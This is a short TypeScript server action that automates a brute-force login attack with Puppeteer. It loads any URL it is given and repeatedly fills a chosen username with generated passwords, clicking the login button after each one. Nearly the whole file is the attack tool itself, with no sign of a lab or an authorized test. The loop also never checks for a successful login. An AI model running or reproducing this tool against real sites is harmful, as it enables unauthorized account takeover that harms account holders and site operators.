"use server";

import puppeteer from "puppeteer";
import {
  bruteForceSchema,
  BruteForceSchema,
} from "./models/brute-force-schema.model";
import { generatePasswords } from "./utils/generate-passwords.util";

export async function submitBruteForceForm(data: BruteForceSchema) {
  const browser = await puppeteer.launch({
    headless: true,
  });
  const page = await browser.newPage();

  // Navigate the page to a URL
  await page.goto(data.url, { waitUntil: "networkidle0" });
  await page.waitForSelector(data.loginFieldSelector);

  let passwords = generatePasswords();
  const responses = [];

  for (const password of passwords) {
    await page.locator(data.loginFieldSelector).fill(data.loginName);
    await page.locator(data.passwordFieldSelector).fill(password);
    await page.locator(data.loginButtonSelector).click();

    await page.waitForResponse((response) => response.status() === 200);
  }

  const content = await page.content();

  await browser.close();

  return { content };
}
